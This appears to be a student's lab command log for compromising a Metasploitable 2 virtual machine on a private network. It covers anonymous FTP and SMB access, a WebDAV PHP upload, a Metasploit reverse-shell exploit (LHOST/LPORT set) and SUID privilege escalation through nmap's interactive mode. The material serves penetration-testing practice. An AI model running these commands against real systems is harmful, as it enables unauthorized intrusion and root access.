# MS2 — Commands Used

## VMware / Network

```bash
uname -r
ip addr show vmnet8
ip route
ip route get 192.168.89.128
ping -c 3 192.168.89.128
```

## FTP

```bash
ftp 192.168.89.128
```

Inside FTP:

```text
anonymous
pwd
ls
dir
ls -la
```

## SMB

```bash
smbclient //192.168.89.128/tmp -N -m NT1
```

Inside SMB:

```text
dir
pwd
put <local-file>
mkdir <directory>
exit
```

## HTTP

```bash
curl -I http://192.168.89.128/
curl -i http://192.168.89.128/ | head -40
```

## Gobuster

```bash
gobuster dir -u http://192.168.89.128/ -w /usr/share/wordlists/dirb/common.txt --timeout 10s -o ms2-gobuster.txt
```

## WebDAV

```bash
curl -i -X OPTIONS http://192.168.89.128/dav/
```

PHP upload:

```bash
curl -i -T ~/ms2-dav-test.php http://192.168.89.128/dav/ms2-dav-test.php
```

PHP verification:

```bash
curl -i http://192.168.89.128/dav/ms2-dav-test.php
```

Cleanup:

```bash
curl -i -X DELETE http://192.168.89.128/dav/ms2-dav-test.php
```

## Metasploit

```text
msfconsole
use exploit/multi/http/webdav_upload_php
show options
set RHOSTS 192.168.89.128
set RPORT 80
set URI /dav/
set LHOST 192.168.89.1
set LPORT 4444
run
sessions -l
```

## Meterpreter / Linux Shell

```text
getuid
sysinfo
pwd
ls
shell
```

Linux enumeration:

```bash
whoami
id
hostname
uname -a
cat /etc/issue
sudo -l
find / -perm -4000 -type f 2>/dev/null | sort
```

Nmap privilege-escalation validation:

```bash
nmap --version
nmap --interactive
```

From the Nmap interactive prompt:

```text
!id
!whoami
```

## Cleanup

Exit the shell/session cleanly and shut down the MS2 VM after the lab.
